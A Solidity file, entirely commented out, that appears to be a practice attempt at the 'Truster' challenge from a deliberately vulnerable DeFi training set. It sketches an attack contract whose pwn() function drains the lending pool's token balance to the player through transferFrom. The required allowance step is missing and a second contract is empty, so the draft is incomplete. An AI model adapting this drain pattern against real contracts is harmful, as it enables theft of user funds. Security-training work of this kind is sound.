// // SPDX-License-Identifier: MIT

// pragma solidity ^0.8.0;

// import {TrusterLenderPool} from "./TrusterLenderPool.sol";
// import "../DamnValuableToken.sol";


// contract TrusterAttack{
//     DamnValuableToken public token;
//     address public player;
//     TrusterLenderPool public target;
    

//     uint256 public amount = 1000000 * 1e18;

//     constructor(TrusterLenderPool _target, DamnValuableToken _token, address _player){
//         token = _token;
//         player = _player;
//         target = TrusterLenderPool(_target);
        
//     }

//     function pwn() public {
//         uint256 bal = token.balanceOf(address(target));
//         token.transferFrom(address(target), player, bal);
//     }
//     // function 
//     // function attack() external payable {
//     //     token.transfer(player, token.balanceOf(address(this)));
//     // }
// }

// contract Attack {
//     address public player;
//     DamnValuableToken public token;

//     constructor(address _player, DamnValuableToken _token) {
//         player = _player;
//         token = _token;
//     }
// }